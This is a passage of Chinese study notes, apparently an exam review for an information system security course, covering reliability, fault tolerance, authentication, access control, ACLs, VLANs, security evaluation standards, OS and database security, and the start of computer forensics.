<li>机房内部防雷主要采取屏蔽、等电位连接、合理布线或防闪器、过电压保护等技术措施以及拦截、屏蔽、均压、分流、接地等方法，达到防雷的目的。机房的设备本身也应有避雷装置和设施。</li>
</ul>
<h3 id="-电磁泄漏的途径"><a href="#-电磁泄漏的途径" class="headerlink" title=" 电磁泄漏的途径"></a> 电磁泄漏的途径</h3><ul>
<li>以电磁波形式的辐射泄漏</li>
<li>电源线、控制线、信号线和地线造成的传导泄漏</li>
</ul>
<h3 id="-抑制电磁信息泄漏的技术途径"><a href="#-抑制电磁信息泄漏的技术途径" class="headerlink" title=" 抑制电磁信息泄漏的技术途径"></a> 抑制电磁信息泄漏的技术途径</h3><ul>
<li>物理抑制技术（抑源法）：从线路和元器件入手，从根本上阻止计算机系统向外辐射电磁波</li>
<li>电磁屏蔽技术：包括设备的屏蔽和环境的屏蔽</li>
<li>噪声干扰技术：在信道上添加噪声，降低窃收系统的信噪比，使其难以还原</li>
</ul>
<h3 id="-电磁战的常见方法"><a href="#-电磁战的常见方法" class="headerlink" title=" 电磁战的常见方法"></a> 电磁战的常见方法</h3><ul>
<li>热效应</li>
<li>射频干扰和浪涌效应</li>
<li>强电场效应</li>
<li>磁效应</li>
</ul>
<h3 id="-保护电磁数据的常规方法"><a href="#-保护电磁数据的常规方法" class="headerlink" title=" 保护电磁数据的常规方法"></a> 保护电磁数据的常规方法</h3><p>防磁柜</p>
<h3 id="-计算机机房的常见要求"><a href="#-计算机机房的常见要求" class="headerlink" title=" 计算机机房的常见要求"></a> 计算机机房的常见要求</h3><p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1547609969224.png" alt="1547609969224"></p>
<h2 id="操作-2"><a href="#操作-2" class="headerlink" title="操作"></a>操作</h2><h1 id="四、信息系统的可靠性"><a href="#四、信息系统的可靠性" class="headerlink" title="四、信息系统的可靠性"></a>四、信息系统的可靠性</h1><h2 id="概念-3"><a href="#概念-3" class="headerlink" title="概念"></a>概念</h2><h3 id="可靠性定义"><a href="#可靠性定义" class="headerlink" title="可靠性定义"></a>可靠性定义</h3><p>在规定的条件下、在给定的时间内，系统能实施应有功能的能力。（规定的、条件、时间、功能）</p>
<h3 id="可靠性参数"><a href="#可靠性参数" class="headerlink" title="可靠性参数"></a>可靠性参数</h3><p>寿命、MTTF（平均失效前时间）、MTBF（平均故障间隔时间）、可靠度、失效率</p>
<h3 id="不可修系统vs可修系统"><a href="#不可修系统vs可修系统" class="headerlink" title="不可修系统vs可修系统"></a>不可修系统vs可修系统</h3><ul>
<li>不可修系统：组成系统的各部件失效后，不对失效的部件进行任何的维修。</li>
<li>可修系统：由一些部件和一个或多个修理设备组成，修理设备对故障设备进行修理，修复后的部件可继续执</li>
</ul>
<h3 id="可维修产品的维修性指标：可用性"><a href="#可维修产品的维修性指标：可用性" class="headerlink" title="可维修产品的维修性指标：可用性"></a>可维修产品的维修性指标：可用性</h3><p>对可维修产品而言，其平均寿命是指两次故障间的时间平均值，称平均故障间隔时间，习惯称平均无故障工作时间MTBF（Mean Time Between Failures）。</p>
<p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1548163602012.png" alt="1548163602012"></p>
<h4 id="不可修产品的维修性指标"><a href="#不可修产品的维修性指标" class="headerlink" title="不可修产品的维修性指标"></a>不可修产品的维修性指标</h4><p>对不可维修的产品的平均寿命是指从开始投入工作，至产品失效的时间平均值，也称平均失效前时间，记以MTTF（Mean Time To Failure）。</p>
<h3 id="可靠性模型"><a href="#可靠性模型" class="headerlink" title="可靠性模型"></a>可靠性模型</h3><p>描述了系统及其组成单元之间的故障逻辑关系。</p>
<p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1548163789009.png" alt="1548163789009"></p>
<p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1548163797702.png" alt="1548163797702"></p>
<h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><h3 id="电子器件有哪些常见失效"><a href="#电子器件有哪些常见失效" class="headerlink" title="电子器件有哪些常见失效"></a>电子器件有哪些常见失效</h3><p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1547610423938.png" alt="1547610423938"></p>
<h3 id="-可维修产品的工作过程"><a href="#-可维修产品的工作过程" class="headerlink" title=" 可维修产品的工作过程"></a> 可维修产品的工作过程</h3><p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1548163860295.png" alt="1548163860295"></p>
<h3 id="-产品的寿命特性：浴盆曲线"><a href="#-产品的寿命特性：浴盆曲线" class="headerlink" title=" 产品的寿命特性：浴盆曲线"></a> 产品的寿命特性：浴盆曲线</h3><p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1547610508224.png" alt="1547610508224"></p>
<ul>
<li>早期失效期：这一阶段失效的原因大多是由于设计、原材料和制造过程中的缺陷造成</li>
<li>随机失效期：失效率较低，且较稳定。设备的可靠性与失效率成指数关系</li>
<li>损耗失效期：主要原因是器件的损失己非常的严重</li>
</ul>
<h3 id="-R-t-和的关系"><a href="#-R-t-和的关系" class="headerlink" title=" R(t)和的关系"></a> R(t)和的关系</h3><p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1547610662797.png" alt="1547610662797"></p>
<h3 id="-串联系统、并联系统、表决系统、冷贮系统-P36"><a href="#-串联系统、并联系统、表决系统、冷贮系统-P36" class="headerlink" title=" 串联系统、并联系统、表决系统、冷贮系统  P36"></a> 串联系统、并联系统、表决系统、冷贮系统  P36</h3><h3 id="-串联系统和并联系统寿命的推导"><a href="#-串联系统和并联系统寿命的推导" class="headerlink" title=" 串联系统和并联系统寿命的推导"></a> 串联系统和并联系统寿命的推导</h3><h3 id="-影响硬件可靠性的环境因素"><a href="#-影响硬件可靠性的环境因素" class="headerlink" title=" 影响硬件可靠性的环境因素"></a> 影响硬件可靠性的环境因素</h3><p>温度变化、湿度、电压、振动、冲击影响</p>
<h3 id="-几种常见的软件可靠性模型"><a href="#-几种常见的软件可靠性模型" class="headerlink" title=" 几种常见的软件可靠性模型"></a> 几种常见的软件可靠性模型</h3><ul>
<li>失效时间间隔模型</li>
<li>缺陷计数模型</li>
<li>错误植入模型</li>
<li>基于输入域的模型</li>
</ul>
<h2 id="操作-3"><a href="#操作-3" class="headerlink" title="操作"></a>操作</h2><p>失效率、寿命的计算    第四讲  P16</p>
<h1 id="五、信息系统的容错技术"><a href="#五、信息系统的容错技术" class="headerlink" title="五、信息系统的容错技术"></a>五、信息系统的容错技术</h1><h2 id="概念-4"><a href="#概念-4" class="headerlink" title="概念"></a>概念</h2><h3 id="容错"><a href="#容错" class="headerlink" title="容错"></a>容错</h3><p>容忍故障，即故障一旦发生时能够自动检测出来并使系统能够自动恢复正常运行</p>
<h3 id="故障检测、故障诊断"><a href="#故障检测、故障诊断" class="headerlink" title="故障检测、故障诊断"></a>故障检测、故障诊断</h3><p> 故障检测（Fault Detection）：判断系统是否存在故障的过程故障检测的作用是确认系统是否发生了故障，指示故障的状态，即查找故障源和故障性质。一般来说，故障检测只能找到错误点（错误单元），不能准确找到故障点。<br> 故障诊断（Fault Diagnosis）：检测出系统存在故障后要进行故障的定位，找出故障所在的位置。</p>
<h3 id="故障屏蔽"><a href="#故障屏蔽" class="headerlink" title="故障屏蔽"></a>故障屏蔽</h3><p>故障屏蔽技术是防止系统中的故障在该系统的信息结构中产生差错的各种措施的总称，其实质是在故障效应达到模块的输出以前，利用冗余资源将故障影响掩盖起来，达到容错目的</p>
<h3 id="冗余技术"><a href="#冗余技术" class="headerlink" title="冗余技术"></a>冗余技术</h3><p>所谓冗余就是超过系统实现正常功能的额外资源。</p>
<p>硬件冗余  软件冗余  时间冗余  信息冗余</p>
<h3 id="RAID技术"><a href="#RAID技术" class="headerlink" title="RAID技术"></a>RAID技术</h3><p>廉价磁盘冗余阵列（Redundant Arrays of Inexpensive Disks），以多个低成本磁盘构成磁盘子系统，提供比单一硬盘更完备的可靠性和高性能。</p>
<h2 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h2><h3 id="容错技术的主要内容："><a href="#容错技术的主要内容：" class="headerlink" title="容错技术的主要内容："></a>容错技术的主要内容：</h3><p>冗余技术、故障屏蔽技术、故障检测与诊断技术</p>
<h3 id="硬件冗余技术（TMR）"><a href="#硬件冗余技术（TMR）" class="headerlink" title="硬件冗余技术（TMR）"></a>硬件冗余技术（TMR）</h3><p>三模冗余（TMR，Triple Modular Redundancy）的基本原理是：系统输入通过3个<br>功能相同的模块，产生的3个结果送到多数表决器进行表决，即三中取二的原则，<br>如果模块中有一个出错，而另外两个模块正常，则表决器的输出正确，从而可以<br>屏蔽一个故障。<br>TMR的缺点是：如果3个模块的输出各不相同，则无法进行多数表决；若有两个<br>模块出现一致的故障，则表决的结果会出现错误。</p>
<h3 id="时间冗余技术（指令复执、程序卷回）"><a href="#时间冗余技术（指令复执、程序卷回）" class="headerlink" title="时间冗余技术（指令复执、程序卷回）"></a>时间冗余技术（指令复执、程序卷回）</h3><p>基本思想：重复执行指令或者一段程序来消除故障的影响，以达到容错的<br>效果，它是用消耗时间来换取容错的目的。根据执行的是一条指令还是一<br>段程序，分成两种方法：<br> 指令复执。当检测出故障的时候，重复执行故障指令。若故障是瞬时的，则<br>在指令复执期间可能不会出现，程序就可以继续向前运行。指令复执必须保<br>留上一指令结束的现场（包括累加器、PC及其他状态寄存器的状态）。<br> 程序卷回。它不是重复执行一条指令，而是重复执行一小段程序。在整段程<br>序中可以设置多个恢复点，程序有错误的情况下可以从一个个恢复点处开始<br>重复执行程序。首先检验一小段程序的计算结果，若结果出现错误则卷回再<br>重复执行那个部分， 若一次卷回不能解决，可以多次卷回，直到故障消除。</p>
<h3 id="软件冗余技术（N-版本编程方法和恢复块技术）"><a href="#软件冗余技术（N-版本编程方法和恢复块技术）" class="headerlink" title="软件冗余技术（N 版本编程方法和恢复块技术）"></a>软件冗余技术（N 版本编程方法和恢复块技术）</h3><p>软件容错是指在出现有限数目的软件故障的情况下，系统仍可提供连<br>续正确执行的内在能力。其目的是屏蔽软件故障，恢复因出故障而影<br>响的运行进程。</p>
<p>实现软件容错的基本方法，是将若干个根据同一需求说明编写的不同<br>程序（即多版本程序），在不同空间同时运行，然后在每一个设置点<br>通过表决或接收测试进行表决</p>
<h3 id="信息冗余技术（纠错码）"><a href="#信息冗余技术（纠错码）" class="headerlink" title="信息冗余技术（纠错码）"></a>信息冗余技术（纠错码）</h3><p>信息容错技术是通过在数据中附加冗余的信息位来达到故障检<br>测和容错的目的。<br> 通常情况下，附加的信息位越多，其检错纠<br>错的能力就越强，但同时也增加了复杂度和<br>难度。信息冗余最常见的有检错码和纠错码。<br> 检错码只能检查出错误的存在，不能改正错<br>误，而纠错码能检查出错误并能纠正错误。<br> 常用的检错纠错码有奇偶校验码、海明码、<br>循环码等</p>
<h3 id="热备份"><a href="#热备份" class="headerlink" title="热备份"></a>热备份</h3><p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1547611479540.png" alt="1547611479540"></p>
<h3 id="决定RAID分级的三个因素"><a href="#决定RAID分级的三个因素" class="headerlink" title="决定RAID分级的三个因素"></a>决定RAID分级的三个因素</h3><ul>
<li>分条：将数据分散到不同物理硬盘上，使读写数据时可以同时访问多块硬盘</li>
<li>数据镜像：将同一数据写在两块不同硬盘上，从而产生该数据的两个副本</li>
<li>奇偶校验</li>
</ul>
<h3 id="RAID0-RAID6-P49"><a href="#RAID0-RAID6-P49" class="headerlink" title="RAID0-RAID6    P49"></a>RAID0-RAID6    P49</h3><ul>
<li>RAID0 数据基带条阵列</li>
<li>RAID1 磁盘镜像</li>
<li>RAID2 并行海明纠错阵列</li>
<li>RAID3 奇偶校验并行位交错阵列</li>
<li>RAID4 奇偶校验扇区交错阵列</li>
<li>RAID5 循环奇偶校验阵列</li>
<li>RAID6 二维奇偶校验阵列</li>
</ul>
<h2 id="操作-4"><a href="#操作-4" class="headerlink" title="操作"></a>操作</h2><p>设计简单的硬件冗余方案           第五讲  P30</p>
<p>三模冗余技术</p>
<p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1548077971287.png" alt="1548077971287"></p>
<h1 id="六、身份认证"><a href="#六、身份认证" class="headerlink" title="六、身份认证"></a>六、身份认证</h1><h2 id="概念-5"><a href="#概念-5" class="headerlink" title="概念"></a>概念</h2><h3 id="身份认证需要解决的问题"><a href="#身份认证需要解决的问题" class="headerlink" title="身份认证需要解决的问题"></a>身份认证需要解决的问题</h3><p>在一个开放的网络环境中，提供服务的服务器必须能够识别请求服务的实体的身份</p>
<h3 id="OTP"><a href="#OTP" class="headerlink" title="OTP"></a>OTP</h3><p>一次性口令认证</p>
<p>主要思路是：在登录过程中加入不确定因素，使每次登录过程中传送的口令信息都不相同，以提高登录过程安全性</p>
<h2 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h2><h3 id="身份认证的基本途径"><a href="#身份认证的基本途径" class="headerlink" title="身份认证的基本途径"></a>身份认证的基本途径</h3><ul>
<li>基于你知道的    知识、口令、密码</li>
<li>基于你拥有的    身份证、信用卡、钥匙、令牌等</li>
<li>基于你的个人特质    指纹、虹膜、声音、笔迹等</li>
</ul>
<h3 id="-常用的身份认证技术-协议：基于口令的认证、第三方认证，CHAP，OTP、Kerberos认证（要求掌握原理）"><a href="#-常用的身份认证技术-协议：基于口令的认证、第三方认证，CHAP，OTP、Kerberos认证（要求掌握原理）" class="headerlink" title=" 常用的身份认证技术/协议：基于口令的认证、第三方认证，CHAP，OTP、Kerberos认证（要求掌握原理）"></a> 常用的身份认证技术/协议：基于口令的认证、第三方认证，CHAP，OTP、Kerberos认证（要求掌握原理）</h3><p> 基于公钥证书的身份认证、基<br>于生物特征的身份认证（仅作<br>常识性的了解）<br> 不确定因子选择与口令生成</p>
<h2 id="操作-5"><a href="#操作-5" class="headerlink" title="操作"></a>操作</h2><p>分析协议的抗攻击性能，例如CHAP协议抗中间人攻击的性能</p>
<h1 id="七、访问控制模型"><a href="#七、访问控制模型" class="headerlink" title="七、访问控制模型"></a>七、访问控制模型</h1><h2 id="概念-6"><a href="#概念-6" class="headerlink" title="概念"></a>概念</h2><h3 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h3><p>访问控制是为了限制访问主体（或称为发起者，是一个主动的实体；如用户、进程、服务等）对访问客体（需要保护的资源）的访问权限，从而使信息系统在合法范围内使用</p>
<p>访问控制是信息系统安全保障机制的核心内容，它是实现数据保密性和完整性机制的主要手段</p>
<p>访问控制机制决定用户及代表一定用户利益的程序能做什么，及做到什么程度</p>
<h3 id="访问控制模型"><a href="#访问控制模型" class="headerlink" title="访问控制模型"></a>访问控制模型</h3><p>在包括数据库系统在内的各种安全系统中，安全模型用于精确地描述该系统的安全需求和安全策略。</p>
<h3 id="角色的概念"><a href="#角色的概念" class="headerlink" title="角色的概念"></a>角色的概念</h3><p>一组权限的组合</p>
<h3 id="访问控制列表"><a href="#访问控制列表" class="headerlink" title="访问控制列表"></a>访问控制列表</h3><h2 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h2><h3 id="Bell-LaPadula模型"><a href="#Bell-LaPadula模型" class="headerlink" title="Bell-LaPadula模型"></a>Bell-LaPadula模型</h3><p>Bell-LaPadula保密性模型是第一个能够提供分级别数据机密性<br>保障的安全策略模型（多级安全）。</p>
<p>基于强制访问控制，以敏感度来划分资源的安全级别</p>
<p>不上读、不下写</p>
<h3 id="BIBA完整性模型及应用"><a href="#BIBA完整性模型及应用" class="headerlink" title="BIBA完整性模型及应用"></a>BIBA完整性模型及应用</h3><h3 id="RBAC"><a href="#RBAC" class="headerlink" title="RBAC"></a>RBAC</h3><p>RBAC的基本思想是将访问许可权分配给一定的角色，用户通过饰演不同<br>的角色获得角色所拥有的访问许可权。<br>五个基本数据元素：用户users（USERS）、角色roles（ROLES）、目标<br>objects（OBS）、操作operations（OPS）、许可权permissions（PRMS）</p>
<p> 加密方式在访问控制系统中的应用<br> 基于访问控制模型对防火墙的策略<br>进行分析<br> Windows 、Linux 、Android 、<br>Oracle的访问控制机制</p>
<h2 id="操作-6"><a href="#操作-6" class="headerlink" title="操作"></a>操作</h2><h1 id="八、访问控制技术之一-ACL"><a href="#八、访问控制技术之一-ACL" class="headerlink" title="八、访问控制技术之一 ACL"></a>八、访问控制技术之一 ACL</h1><h2 id="概念-7"><a href="#概念-7" class="headerlink" title="概念"></a>概念</h2><h3 id="ACL的作用"><a href="#ACL的作用" class="headerlink" title="ACL的作用"></a>ACL的作用</h3><p>访问控制列表是一系列允许或拒绝数据的指令的集合</p>
<p>ACL具有灵活的数据流过滤和控制能力</p>
<h3 id="通配掩码"><a href="#通配掩码" class="headerlink" title="通配掩码"></a>通配掩码</h3><p>路由器使用IP地址和通配掩码（wildcard-mask）一起来分辨匹配的地址范围，它跟子网掩码刚好相反</p>
<p>它不像子网掩码告诉路由器IP地址的哪一位属于网络号一样，通配符掩码告诉路由器为了判断出匹配，它需要检查IP地址中的多少位</p>
<p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1547712849826.png" alt="1547712849826"></p>
<h3 id="Any和host"><a href="#Any和host" class="headerlink" title="Any和host"></a>Any和host</h3><p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1547712981384.png" alt="1547712981384"></p>
<p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1547712991664.png" alt="1547712991664"></p>
<h2 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h2><h5 id="ACL的分类"><a href="#ACL的分类" class="headerlink" title="ACL的分类"></a>ACL的分类</h5><ul>
<li><p>标准ACL</p>
<p>​      只使用数据包的源地址作为测试条件。所有决定是基于源IP地址的</p>
</li>
<li><p>命名ACL</p>
<p>​      命名ACL以列表名代替列表编号来定义IP访问控制列表，同样包括标准和扩展两种列表，定义过滤的语句与编号方式中相似。</p>
</li>
<li><p>扩展ACL</p>
<p>​      可以测试IP包的第3层和第4层报头中的字段。包括源IP地址、目的IP地址、网络层报头中的协议字段（如，TCP、UDP、ICMP等）以及位于传输层报头中的端口号。</p>
</li>
</ul>
<h5 id="-不同类型ACL的编制"><a href="#-不同类型ACL的编制" class="headerlink" title=" 不同类型ACL的编制"></a> 不同类型ACL的编制</h5><h5 id="-通配掩码的工作原理-第八讲-P19"><a href="#-通配掩码的工作原理-第八讲-P19" class="headerlink" title=" 通配掩码的工作原理     第八讲  P19"></a> 通配掩码的工作原理     第八讲  P19</h5><h5 id="-ACL的部署位置"><a href="#-ACL的部署位置" class="headerlink" title=" ACL的部署位置"></a> ACL的部署位置</h5><h2 id="操作-7"><a href="#操作-7" class="headerlink" title="操作"></a>操作</h2><p>ACL的配置   第八讲</p>
<p>通配掩码的计算   第八讲</p>
<h1 id="九、访问控制技术之二-VLAN"><a href="#九、访问控制技术之二-VLAN" class="headerlink" title="九、访问控制技术之二 VLAN"></a>九、访问控制技术之二 VLAN</h1><h2 id="概念-8"><a href="#概念-8" class="headerlink" title="概念"></a>概念</h2><h3 id="VLAN"><a href="#VLAN" class="headerlink" title="VLAN"></a>VLAN</h3><p>VLAN是一种将局域网设备从逻辑上划分成一个个网段，从而实现虚<br>拟工作组的新型数据交换技术</p>
<h3 id="虚拟机局域网-真实局域网"><a href="#虚拟机局域网-真实局域网" class="headerlink" title="虚拟机局域网 真实局域网"></a>虚拟机局域网 真实局域网</h3><p>虚拟化就是把局域网的成员（主机、网桥/交换机）按照一定分组规则划分到不同的集合中，每一个集合就是一个虚拟局域网</p>
<h3 id="VLAN特点"><a href="#VLAN特点" class="headerlink" title="VLAN特点"></a>VLAN特点</h3><h3 id="VLAN的分类："><a href="#VLAN的分类：" class="headerlink" title="VLAN的分类："></a>VLAN的分类：</h3><ul>
<li>基于端口</li>
<li>基于MAC地址</li>
<li>根据网络层协议或地址</li>
</ul>
<h3 id="-跨交换机的VLAN实现"><a href="#-跨交换机的VLAN实现" class="headerlink" title=" 跨交换机的VLAN实现"></a> 跨交换机的VLAN实现</h3><p>通常采用主干连接、ISL与帧标记等技术来实现同一VLAN的成员之间的通信</p>
<h3 id="-同一VLAN内主机通信"><a href="#-同一VLAN内主机通信" class="headerlink" title=" 同一VLAN内主机通信"></a> 同一VLAN内主机通信</h3><p>为每一个VLAN直接建立一条链路，不同的VLAN内成员间的通信通过各自的链路进行，互不影响</p>
<h3 id="-VLAN间的主机通信-P29"><a href="#-VLAN间的主机通信-P29" class="headerlink" title=" VLAN间的主机通信    P29"></a> VLAN间的主机通信    P29</h3><p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1547712204532.png" alt="1547712204532"></p>
<h3 id="-交换网中链路的类型"><a href="#-交换网中链路的类型" class="headerlink" title=" 交换网中链路的类型"></a> 交换网中链路的类型</h3><h3 id="-交换机接口模式"><a href="#-交换机接口模式" class="headerlink" title=" 交换机接口模式"></a> 交换机接口模式</h3><h3 id="-IEEE802-1Q对比Cisco-ISL-第九讲-P21"><a href="#-IEEE802-1Q对比Cisco-ISL-第九讲-P21" class="headerlink" title=" IEEE802.1Q对比Cisco ISL   第九讲 P21"></a> IEEE802.1Q对比Cisco ISL   第九讲 P21</h3><h3 id="-VLAN实现信息同步的方式：VTP协议"><a href="#-VLAN实现信息同步的方式：VTP协议" class="headerlink" title=" VLAN实现信息同步的方式：VTP协议"></a> VLAN实现信息同步的方式：VTP协议</h3><p>VLAN中继协议（VLAN TRUNKING PROTOCOL）是Cisco专用<br>协议，大多数交换机都支持该协议。<br> VTP负责在VTP域内同步VLAN信息，这样就不必在每个交<br>换上配置相同的VLAN信息。<br> VTP最重要的作用是，将进行变动时可能会出现在的配置不<br>一致性降至最低。</p>
<h2 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h2><h2 id="操作-8"><a href="#操作-8" class="headerlink" title="操作"></a>操作</h2><p> VLAN的配置第九讲 P27</p>
<p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1548078249611.png" alt="1548078249611"></p>
<p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1548078299710.png" alt="1548078299710"></p>
<h1 id="十、信息系统安全评估标准介绍"><a href="#十、信息系统安全评估标准介绍" class="headerlink" title="十、信息系统安全评估标准介绍"></a>十、信息系统安全评估标准介绍</h1><h2 id="概念-9"><a href="#概念-9" class="headerlink" title="概念"></a>概念</h2><h3 id="TCSEC"><a href="#TCSEC" class="headerlink" title="TCSEC"></a>TCSEC</h3><p>可信计算机安全评估准则</p>
<h3 id="通用准则CC及CC的几个概念：TOE、PP、ST、SFR、SAR、EAL"><a href="#通用准则CC及CC的几个概念：TOE、PP、ST、SFR、SAR、EAL" class="headerlink" title="通用准则CC及CC的几个概念：TOE、PP、ST、SFR、SAR、EAL"></a>通用准则CC及CC的几个概念：TOE、PP、ST、SFR、SAR、EAL</h3><p>CC标准是最为全面和公认的面向产品评估的信息安全评估标准</p>
<p> 定义了评价信息技术产品和系统安全性的基本准则<br> 提出了目前国际上公认的表述信息技术安全性的结构</p>
<p>TOE 评估对象（Target of Evaluation，TOE）</p>
<p>PP 安全轮廓  Protection Profile</p>
<p>ST   产品评估  Security Target</p>
<p>SFR Security Functional Requirements</p>
<p>SAR Security Assurance Requirements</p>
<p>EAL 评估保证级 Evaluation Assurance Level）</p>
<h2 id="原理-9"><a href="#原理-9" class="headerlink" title="原理"></a>原理</h2><p> TCSEC定义的安全等级</p>
<p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1547711496100.png" alt="1547711496100"></p>
<p> CC定义的EAL</p>
<p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1547711543606.png" alt="1547711543606"></p>
<h2 id="操作-9"><a href="#操作-9" class="headerlink" title="操作"></a>操作</h2><h1 id="十一、操作系统安全（上）-基于活动目录的域安全机制"><a href="#十一、操作系统安全（上）-基于活动目录的域安全机制" class="headerlink" title="十一、操作系统安全（上） 基于活动目录的域安全机制"></a>十一、操作系统安全（上） 基于活动目录的域安全机制</h1><h2 id="概念-10"><a href="#概念-10" class="headerlink" title="概念"></a>概念</h2><h3 id="域，工作组，域控制器"><a href="#域，工作组，域控制器" class="headerlink" title="域，工作组，域控制器"></a>域，工作组，域控制器</h3><p>域就是共享用户账号、计算机账号和安全策略的计算机集合</p>
<p>域模型就是针对大型网络的管理需求而设计的</p>
<p>域中集中存储用户账号的计算机就是域控制器</p>
<h3 id="目录和目录服务"><a href="#目录和目录服务" class="headerlink" title="目录和目录服务"></a>目录和目录服务</h3><p>目录是存储各种对象的容器，保存集中管理的共享资源信息，包括服务器信息、文件信息、打印机信息、用户账号等信息</p>
<p>活动目录：将网络中的各种网络设备、网络服务、网络账号等资源信息集中起来进行管理，为用户提供一个统一的清单</p>
<h3 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h3><p> 活动目录就其本质来讲，是一种采用LDAP（轻量级目录访<br>问协议）的目录服务<br> 活动目录包括两个方面：目录、目录相关的服务</p>
<h3 id="OU"><a href="#OU" class="headerlink" title="OU"></a>OU</h3><p>OU是一种类型的目录对象–容器，其作用主要用来委派对<br>用户、组及资源集合的管理权限<br> 控制用户/组对资源的访问<br> 建立/应用组策略对象<br> 实现管理委派<br> 组织具有公共属性的对象，如打印机</p>
<h3 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h3><p>组策略是Windows Server 2003操作系统中提供的一种重要的更新和<br>配置管理技术。<br> 系统管理员使用组策略来为计算机和用户组管理桌面配置指定的选项。<br> 组策略很灵活，它包括如下的一些选项：基于注册表的策略设置、安全<br>设置、软件安装、脚本、计算机启动与关闭、用户登录和注销，文件重<br>定向等。<br> Windows Server 2003包括几百种可以配置的组策略设置。组策略设置允<br>许企业管理员通过增强和控制用户桌面来减少总的开销。</p>
<h2 id="原理-10"><a href="#原理-10" class="headerlink" title="原理"></a>原理</h2><h2 id="操作-10"><a href="#操作-10" class="headerlink" title="操作"></a>操作</h2><h1 id="十二、操作系统安全（下）-Android安全概述"><a href="#十二、操作系统安全（下）-Android安全概述" class="headerlink" title="十二、操作系统安全（下） Android安全概述"></a>十二、操作系统安全（下） Android安全概述</h1><h2 id="概念-11"><a href="#概念-11" class="headerlink" title="概念"></a>概念</h2><h5 id="Android若干概念-sandbox-、Linux-Kernel-、DVM"><a href="#Android若干概念-sandbox-、Linux-Kernel-、DVM" class="headerlink" title="Android若干概念:sandbox  、Linux Kernel 、DVM"></a>Android若干概念:sandbox  、Linux Kernel 、DVM</h5><h5 id="Android组件模型"><a href="#Android组件模型" class="headerlink" title="Android组件模型"></a>Android组件模型</h5><ul>
<li>Activity    为用户操作而展示的可视化用户界面</li>
<li>Service    服务是运行在后台的功能模块，如文件下载、音乐播放程序等</li>
<li>Broadcast Receive   专注于接收广播通知信息，并做出对应处理的组件</li>
<li>Content Provider   Android 平台应用程序间数据共享的一种标准接口，它以类似于URI的方式来表示数据</li>
</ul>
<h2 id="原理-11"><a href="#原理-11" class="headerlink" title="原理"></a>原理</h2><p> Android的体系架构<br> Android的安全机制</p>
<h5 id="-Android-的权限分类"><a href="#-Android-的权限分类" class="headerlink" title=" Android 的权限分类"></a> Android 的权限分类</h5><ul>
<li>Android手机所有者权限</li>
<li>Android root权限</li>
<li>Android 应用程序权限</li>
</ul>
<h2 id="操作-11"><a href="#操作-11" class="headerlink" title="操作"></a>操作</h2><h1 id="十三、数据库安全之Oracle安全概述"><a href="#十三、数据库安全之Oracle安全概述" class="headerlink" title="十三、数据库安全之Oracle安全概述"></a>十三、数据库安全之Oracle安全概述</h1><h2 id="概念-12"><a href="#概念-12" class="headerlink" title="概念"></a>概念</h2><h5 id="oracle例程"><a href="#oracle例程" class="headerlink" title="oracle例程"></a>oracle例程</h5><p>当用户连接到数据库并使用数据库时，实际上是连接到该数据库的例程，通过例程来连接、使用数据库。<br>所以例程是用户和数据库之间的中间层。<br>例程与数据库的区别：<br>• 数据库指的是存储数据的物理结构，总是实际存在的；<br>• 例程则是由内存结构和一系列进程组成，可以启动和关闭。</p>
<h5 id="oracle数据库三大结构"><a href="#oracle数据库三大结构" class="headerlink" title="oracle数据库三大结构"></a>oracle数据库三大结构</h5><ul>
<li>进程结构   </li>
<li>内存结构</li>
<li>存储结构   Oracle 保存数据的容器。分物理存储结构及逻辑存储结构。</li>
</ul>
<h2 id="原理-12"><a href="#原理-12" class="headerlink" title="原理"></a>原理</h2><p>Oracle的体系架构及安全机制</p>
<p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1547630684608.png" alt="1547630684608"></p>
<p><img src="C:\Users\13638\AppData\Roaming\Typora\typora-user-images\1547630667575.png" alt="1547630667575"></p>
<h2 id="操作-12"><a href="#操作-12" class="headerlink" title="操作"></a>操作</h2><h1 id="十四、计算机取证技术概论"><a href="#十四、计算机取证技术概论" class="headerlink" title="十四、计算机取证技术概论"></a>十四、计算机取证技术概论</h1><h2 id="概念-13"><a href="#概念-13" class="headerlink" title="概念"></a>概念</h2><h5 id="计算机取证"><a href="#计算机取证" class="headerlink" title="计算机取证"></a>计算机取证</h5><p>计算机取证是指对能够为法庭接受的、足够可靠和有说服力的，存在于计算机和相关外设中的计算机证据的确认、保护、提取和归档的过程。</p>
<h5 id="潜在证据"><a href="#潜在证据" class="headerlink" title="潜在证据"></a>潜在证据</h5><h2 id="原理-13"><a href="#原理-13" class="headerlink" title="原理"></a>原理</h2><h5 id="取证的基本流程"><a href="#取证的基本流程" class="headerlink" title="取证的基本流程"></a>取证的基本流程</h5><blockquote>
<ol>
<li>获取基本信息</li>
<li>获取易失性数据</li>
<li>制作司法鉴定复件</li>
<li>查找并清除恶意代码</li>
